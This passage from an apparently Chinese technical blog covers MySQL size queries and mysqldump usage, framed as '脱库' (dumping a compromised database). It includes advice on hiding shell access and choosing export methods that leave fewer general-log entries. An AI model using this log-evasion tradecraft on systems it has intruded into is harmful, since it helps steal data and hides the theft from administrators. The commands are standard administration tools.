class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use information_schema;</span><br><span class="line"><span class="keyword">select</span> concat(round(<span class="built_in">sum</span>(DATA_LENGTH<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>),<span class="number">2</span>),<span class="string">&#x27;MB&#x27;</span>) <span class="keyword">as</span> data <span class="keyword">from</span> TABLES;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74245.jpg"                      alt="image-20220829143834770"                ></p><p>​    查看指定数据库每一个表容量大小:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">as</span> <span class="string">&#x27;数据库&#x27;</span>, table_name <span class="keyword">as</span> <span class="string">&#x27;表名&#x27;</span>,table_rows <span class="keyword">as</span> <span class="string">&#x27;记录数&#x27;</span>,<span class="keyword">truncate</span>(data_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>) <span class="keyword">as</span> <span class="string">&#x27;数据容量(MB)&#x27;</span>,<span class="keyword">truncate</span>(index_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>) <span class="keyword">as</span> <span class="string">&#x27;索引容量(MB)&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;mysql&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> data_length <span class="keyword">desc</span>, index_length <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074246.jpg"                      alt="image-20220829144425000"                ></p><p>​    查看指定单个数据库容量大小：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">as</span> <span class="string">&#x27;数据库&#x27;</span>, <span class="built_in">sum</span>(table_rows) <span class="keyword">as</span> <span class="string">&#x27;记录数&#x27;</span>, <span class="built_in">sum</span>(<span class="keyword">truncate</span>(data_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;数据容量(MB)&#x27;</span>, <span class="built_in">sum</span>(<span class="keyword">truncate</span>(index_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;索引容量(MB)&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;mysql&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074247.jpg"                      alt="image-20220829144743445"                ></p><p>​    查询每个裤总容量：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">as</span> <span class="string">&#x27;数据库&#x27;</span>, <span class="built_in">sum</span>(table_rows) <span class="keyword">as</span> <span class="string">&#x27;记录数&#x27;</span>,<span class="built_in">sum</span>(<span class="keyword">truncate</span>(data_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;数据容量(MB)&#x27;</span>,<span class="built_in">sum</span>(<span class="keyword">truncate</span>(index_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;索引容量(MB)&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> table_schema <span class="keyword">order</span> <span class="keyword">by</span> <span class="built_in">sum</span>(data_length) <span class="keyword">desc</span>, <span class="built_in">sum</span>(index_length) <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074248.jpg"                      alt="image-20220829144843585"                ></p><h4 id="脱裤备份🫣"><a href="#脱裤备份🫣" class="headerlink" title="脱裤备份🫣"></a>脱裤备份🫣</h4><p>​    脱某个数据库 ，不需要进入数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Linux</span><br><span class="line">语法：mysqldump <span class="operator">-</span>h主机名 <span class="operator">-</span>P 端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 <span class="comment">--databases 数据库名 &gt; 文件名.sql </span></span><br><span class="line">例子：mysqldump <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.10</span><span class="number">.25</span> <span class="operator">-</span>P <span class="number">3306</span> <span class="operator">-</span>uroot <span class="operator">-</span>proot <span class="comment">--databases mysql &gt; /data/backup/www.sql;</span></span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">语法：mysqldump <span class="operator">-</span>h1主机名 <span class="operator">-</span>p端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>密码 库名  <span class="operator">&gt;</span> 文件名.<span class="keyword">sql</span></span><br><span class="line">例子：mysqldump <span class="operator">-</span>h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>p3306 <span class="operator">-</span>uroot <span class="operator">-</span>proot mysql  <span class="operator">&gt;</span> <span class="number">111.</span><span class="keyword">sql</span></span><br></pre></td></tr></table></figure><p>​    以上的命令在mysql5.6以下是可以执行的，5.6以上会报错</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74251.jpg"                      alt="image-20220829151400174"                ></p><p>​    虽然warning了，但是我们看到已经成功执行，看看内容。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074252.jpg"                      alt="image-20220830132354151"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074253.jpg"                      alt="image-20220830132439556"                ></p><p>​    </p><p>​    如果不想显示我们有shell，那么在修改配置文件/etc/mysql/my.cnf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqldump]</span><br><span class="line"> </span><br><span class="line">user=root</span><br><span class="line">password=&quot;mima&quot;</span><br></pre></td></tr></table></figure><p>​    然后直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump 库名 表名 &gt; /data/bak/表_2022-06-09.sql</span><br></pre></td></tr></table></figure><p>​    如果没有的话，我们可以选择navicat的数据导出</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074254.jpg"                      alt="image-20220829172137656"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074256.jpg"                      alt="image-20220829165523963"                ></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Init DB test</span><br><span class="line">Query<span class="keyword">SHOW</span> <span class="keyword">FULL</span> COLUMNS <span class="keyword">FROM</span> `test_table`</span><br></pre></td></tr></table></figure><p>​    在日志上也只有这两行。如果使用mysqldump则记录很多，下面是搜到的小技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份全部数据库（包含存储过程、自定义函数及事件）</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --all-databases &gt; /tmp/all_database.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要求记录 binlog 位点信息 可用于搭建从库</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --all-databases --master-data=2 &gt; /tmp/all_database.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份指定数据库</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --databases db1 &gt; /tmp/db1.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --databases db1 db2 &gt; /tmp/db1_db2.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份部分表</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 &gt; /tmp/tb1.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 tb2 tb3 &gt; /tmp/tb.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出某个表，数据以单行insert显示</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction --skip-extended-insert db1 tb1 &gt; /tmp/tb1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出单表的部分数据</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 --<span class="built_in">where</span>=<span class="string">&quot; create_time &gt;= &#x27;2021-06-01 00:00:00&#x27; &quot;</span> &gt; /tmp/tb1.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 --<span class="built_in">where</span>=<span class="string">&#x27;id &lt; 10&#x27;</span> &gt; /tmp/tb1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除某些表导出</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction --databases db1 --ignore-table=db1.tb1 --ignore-table=db1.tb2 &gt; /tmp/db1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只导出结构或只导出数据</span></span><br><span class="line">mysqldump -uroot -pxxxxxx db1 --no-data &gt; /tmp/db1_jiegou.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx db1 --no-create-info &gt; /tmp/db1_data.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只导出某个库的存储过程及自定义函数</span></span><br><span class="line">mysqldump -uroot -pxxxxxx -d -t -R db1 &gt; /tmp/db1_routine.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程导出 即MySQL服务端不在本地</span></span><br><span class="line">mysqldump -uroot -pxxxxxx -hxxx.xxx.xx -P3306 --single-transaction --databases db1 &gt; /tmp/db1.sql</span><br></pre></td></tr></table></figure><p>​    下面根据网上的资源简单分析：</p><p>​    mysqldump的大概流程整理如下（白话）：<br>​    1：连接数据库，校验账户，密码，IP<br>​    2：进入INFORMATION_SCHEMA库，获取要备份的数据库的信息，包含存储过程，视图，表<br>​    3：进入INFORMATION_SCHEMA库，获取每个表的字段名称，字段类型等信息<br>​    4：查询每个表的数据，select SQL_NO_CACHE from tbname<br>​    5：拼接成DDL SQL<br>​    6：写入备份文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>FLUSH <span class="operator">/</span><span class="operator">!</span><span class="number">40101</span> <span class="keyword">LOCAL</span> <span class="operator">/</span> TABLES </span><br><span class="line">关闭所有在内存中打开的表，清理查询缓存。</span><br><span class="line"><span class="number">2.</span>FLUSH TABLES <span class="keyword">WITH</span> READ LOCK </span><br><span class="line">加一个全局读锁，只允许读，不允许更新操作。</span><br><span class="line"><span class="number">3.</span><span class="keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ </span><br><span class="line">设置当前会话的事务隔离等级为RR，RR可避免不可重复读和幻读，保证在备份期间，一个事务中所有相同的查询读取到同样的数据。</span><br><span class="line"><span class="number">4.</span><span class="keyword">START</span> TRANSACTION <span class="operator">/</span><span class="operator">!</span><span class="number">40100</span> <span class="keyword">WITH</span> CONSISTENT SNAPSHOT <span class="operator">/</span> </span><br><span class="line">获取当前数据库的快照，这个是由mysqldump中–single<span class="operator">-</span>transaction决定的,类似于开启事务并对所有表执行了一次<span class="keyword">SELECT</span>操作，这样可保证备份时，在任意时间点执行<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span>得到的数据和执行<span class="keyword">START</span> TRANSACTION <span class="keyword">WITH</span> CONSISTENT SNAPSHOT时的数据一致。</span><br><span class="line"><span class="number">5.</span><span class="keyword">SHOW</span> MASTER STATUS </span><br><span class="line">–master<span class="operator">-</span>data决定的，记录了开始备份时，binlog的状态信息，包括MASTER_LOG_FILE和MASTER_LOG_POS</span><br><span class="line"><span class="number">6.</span>UNLOCK TABLES </span><br><span class="line">释放锁，也就是说其实mysqldump这个语句，其实是有锁表，只不过锁了很短的时间</span><br><span class="line"><span class="number">7.</span><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> test </span><br><span class="line">生成创库语句。</span><br><span class="line"><span class="number">8.</span><span class="keyword">SAVEPOINT</span> sp </span><br><span class="line">设置<span class="keyword">SAVEPOINT</span>，然后备份完每个表后再回滚到该<span class="keyword">SAVEPOINT</span>。</span><br><span class="line"><span class="number">9.</span><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> test </span><br><span class="line">生成创表语句</span><br><span class="line"><span class="number">10.</span><span class="keyword">SELECT</span> <span class="operator">/</span><span class="operator">!</span><span class="number">40001</span> SQL_NO_CACHE <span class="operator">/</span> <span class="operator">*</span> <span class="keyword">FROM</span> test </span><br><span class="line">该语句会查询到表test1的所有数据，在备份文件中会生成相应的<span class="keyword">insert</span>语句。 </span><br><span class="line">其中SQL_NO_CACHE的作用是查询的结果并不会缓存到查询缓存中。</span><br><span class="line"><span class="number">11.</span><span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;test&#x27;</span>； </span><br><span class="line">备份触发器。</span><br><span class="line"><span class="number">12.</span><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp </span><br><span class="line">如果不执行<span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp，可能会阻塞同时进行的DDL操作，执行了该语句后，DDL操作可以继续执行。</span><br><span class="line"><span class="number">13.</span><span class="keyword">SHOW</span> <span class="keyword">FUNCTION</span> STATUS <span class="keyword">WHERE</span> Db <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> </span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> mycat_seq_currval </span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">PROCEDURE</span> STATUS <span class="keyword">WHERE</span> Db <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> </span><br><span class="line">用于备份存储过程和函数</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#首先连接到数据库<span class="keyword">connect</span></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.409166</span>Z  <span class="number">123</span> <span class="keyword">Connect</span>root<span class="variable">@loacalhost</span> <span class="keyword">on</span>  <span class="keyword">using</span> Socket</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.409796</span>Z  <span class="number">123</span> Query<span class="comment">/*!40100 SET @@SQL_MODE=&#x27;&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.410370</span>Z  <span class="number">123</span> Query<span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.410941</span>Z  <span class="number">123</span> Query<span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;gtid\_mode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.413782</span>Z  <span class="number">123</span> Query<span class="keyword">SELECT</span> LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;UNDO LOG&#x27;</span> <span class="keyword">AND</span> FILE_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> LOGFILE_GROUP_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>))) <span class="keyword">GROUP</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE <span class="keyword">ORDER</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.416628</span>Z  <span class="number">123</span> Query<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLESPACE_NAME, LOGFILE_GROUP_NAME</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.418387</span>Z  <span class="number">123</span> Query<span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;ndbinfo\_version&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.420250</span>Z  <span class="number">123</span> Init DBtest</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.420786</span>Z  <span class="number">123</span> Query<span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `test`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.421379</span>Z  <span class="number">123</span> Query<span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.422627</span>Z  <span class="number">123</span> QueryLOCK TABLES `test_table` READ <span class="comment">/*!32311 LOCAL */</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.423269</span>Z  <span class="number">123</span> Query<span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;test\_table&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.424678</span>Z  <span class="number">123</span> Query<span class="keyword">SET</span> SQL_QUOTE_SHOW_CREATE<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.425241</span>Z  <span class="number">123</span> Query<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.425818</span>Z  <span class="number">123</span> Query<span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.426554</span>Z  <span class="number">123</span> Query<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.427116</span>Z  <span class="number">123</span> Query<span class="keyword">show</span> fields <span class="keyword">from</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.428382</span>Z  <span class="number">123</span> Query<span class="keyword">show</span> fields <span class="keyword">from</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.429591</span>Z  <span class="number">123</span> Query<span class="keyword">SELECT</span> <span class="comment">/*!40001 SQL_NO_CACHE */</span> <span class="operator">*</span> <span class="keyword">FROM</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.430238</span>Z  <span class="number">123</span> Query<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.430767</span>Z  <span class="number">123</span> Queryuse `test`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.431325</span>Z  <span class="number">123</span> Query<span class="keyword">select</span> @<span class="variable">@collation</span>_database</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.431900</span>Z  <span class="number">123</span> Query<span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;test\_table&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.433084</span>Z  <span class="number">123</span> Query<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.433627</span>Z  <span class="number">123</span> QueryUNLOCK TABLES</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.436134</span>Z  <span class="number">123</span> Quit</span><br></pre></td></tr></table></figure><p>​    我们看到，他会将数据库所有的表做LOCK TABLE，所有表导出完成，才会执行UNLOCK TABLES，因此在导出过程中所有的表都禁止操作。</p><p>​    还有另外两种办法我们也同时看看好了，开发常用，脱裤无所谓了🥵。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -udumper -pdumper --lock-all-tables <span class="built_in">test</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">31</span>:<span class="number">37.989701</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1892</span> Query  <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_output&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">32</span>:<span class="number">08.981051</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1892</span> Query  <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general_log&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">32</span>:<span class="number">39.291966</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1892</span> Quit  </span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.146784</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> <span class="keyword">Connect</span>  root<span class="variable">@localhost</span> <span class="keyword">on</span>  <span class="keyword">using</span> Socket</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.146963</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span 